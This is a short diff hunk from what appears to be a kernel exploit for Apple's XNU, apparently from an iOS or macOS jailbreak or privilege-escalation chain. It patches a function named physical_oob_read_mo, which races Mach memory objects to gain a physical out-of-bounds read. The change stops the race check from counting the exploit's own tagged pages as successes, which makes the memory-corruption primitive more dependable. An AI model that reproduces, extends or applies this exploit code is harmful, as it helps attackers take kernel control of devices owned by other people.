@@ -70,7 +70,16 @@ kern_return_t physical_oob_read_mo(mach_port_t mo, mach_vm_offset_t mo_offset, u
             pread(g_ctx.read_fd, buffer, size, 0x3f00 + offset);
             uint64_t marker = 0;
             memcpy(&marker, buffer, sizeof(marker));
-            if (marker != g_ctx.random_marker) {
+            // V25.1: reject our own tag echo. After a mid-copy remap the
+            // staging keeps reading through pc VA into the remapped search
+            // object itself — whose pages are the v25 tags (0xC0DEC0DE|idx) —
+            // so !=marker alone passed every self-read (the 12 logged a win
+            // at every offset, no PCB). A real win = pool content that is
+            // neither the marker NOR our own tags.
+            if ((uint32_t)(marker >> 32) == 0xC0DEC0DEu) {
+                usleep(1);
+            }
+            else if (marker != g_ctx.random_marker) {
                 read_race_succeeded = true;
                 g_ctx.success_read_count += 1;
                 if (try_idx > g_ctx.highiest_success_idx) {
